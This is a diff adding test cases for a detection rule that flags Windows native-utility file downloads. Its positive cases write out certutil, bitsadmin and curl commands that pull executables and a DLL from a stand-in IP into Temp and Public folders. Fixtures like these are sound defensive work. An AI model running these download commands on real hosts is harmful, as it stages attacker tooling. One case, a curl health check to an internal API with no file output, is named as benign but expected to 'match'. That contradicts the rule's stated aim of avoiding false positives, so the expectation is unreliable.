@@ -1,0 +1,53 @@
+rule: TH-016-ingress-tool-transfer
+description: >
+  Positives are the three most common native-utility transfers. The certutil negative is important:
+  the same binary is used legitimately for hashing, and a rule keyed on the image name alone would
+  fire on every integrity check in the estate.
+cases:
+  - name: certutil URL cache download
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.20/tool.exe C:\Windows\Temp\tool.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: bitsadmin transfer job
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin.exe /transfer job /download /priority high http://198.51.100.20/a.dll C:\Users\Public\a.dll'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: curl download into a public directory
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\curl.exe'
+      CommandLine: 'curl.exe -s -o C:\Users\Public\x.exe http://198.51.100.20:8443/x.exe'
+      ParentImage: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: certutil used to hash a local file
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -hashfile C:\Program Files\Contoso\agent.exe SHA256'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\adm-jdoe'
+
+  - name: curl calling an internal API with no file output
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\curl.exe'
+      CommandLine: 'curl.exe -s https://api.contoso.local/health'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\svc-monitor'
+
+  - name: Notepad opening a file is not a transfer
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\notepad.exe'
+      CommandLine: 'notepad.exe C:\Users\Public\readme.txt'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'CONTOSO\jdoe'
